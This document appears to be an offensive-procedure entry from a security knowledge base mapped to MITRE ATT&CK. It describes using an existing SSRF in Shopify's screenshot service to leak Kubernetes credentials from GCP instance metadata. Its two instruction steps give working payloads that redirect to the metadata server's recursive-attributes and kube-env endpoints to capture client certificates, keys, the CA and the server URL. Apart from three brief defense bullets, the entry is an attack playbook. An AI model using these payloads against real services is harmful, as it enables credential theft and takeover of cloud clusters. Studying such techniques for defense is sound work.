---
tags:
  - gcp
  - kubernetes
  - credential-leak
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/kubectl]]'
  - '[[tools/Image-Editing-Software]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Discovery]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-set-instance-metadata]]'
  - '[[commands/curl-query-token-info]]'
  - '[[commands/kubectl-get-pods]]'
  - '[[commands/kubectl-create-pod]]'
  - '[[commands/kubectl-delete-pod]]'
  - '[[commands/kubectl-exec-pod]]'
  - '[[commands/kubectl-describe-pod]]'
  - '[[commands/kubectl-get-secret]]'
  - '[[commands/kubectl-exec-pod-with-token]]'
  - '[[commands/kubectl-exec-pod-with-token-namespace]]'
  - '[[commands/id]]'
  - '[[commands/ls]]'
  - '[[commands/exit]]'
platforms:
  - GCP
  - Kubernetes
techniques:
  - '[[Unsecured Credentials]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e447a4fa-24ab-4eb7-b2e7-ce6044414216
created_at: '2025-12-11T06:10:23.598Z'
updated_at: '2025-12-11T06:10:23.598Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0007]]'
  - '[[TA0006]]'
mitre_techniques:
  - '[[T1552]]'
---
# Leak Kubernetes Credentials from GCP Metadata

## Summary

This procedure extends SSRF to recursively leak Kubernetes environment details, including certificates and keys, from GCP metadata.

## Description

By targeting recursive metadata endpoints, capture kube-env attributes exposing Kubernetes certs, keys, and server details for cluster access.

## Requirements

1. Established SSRF vector in Shopify
2. Image viewing tools
3. Knowledge of GCP metadata structure

## Defense

Defensive measures and detection strategies:

- Enable metadata concealment
- Use shielded VMs
- Monitor screenshot service for internal URL access

## Objectives

1. Obtain Kubernetes client certs and keys
2. Extract CA and server URL
3. Enable kubectl interactions

## Instructions

### Step 1: Dump Recursive Attributes

**Context**: Leak all instance attributes.

Modify script: window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json"; Trigger screenshot.

> Expected: JSON with kube-env in image.

### Step 2: Target Kube-Env Specifically

**Context**: Extract certs and keys.

Modify to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json. Capture and extract.

> Expected: Certificates and keys in JSON.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]
- [[Credential Access]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/Image-Editing-Software]]
- [[tools/Chrome]]

## Tags

- [[gcp]]
- [[kubernetes]]
- [[credential-leak]]
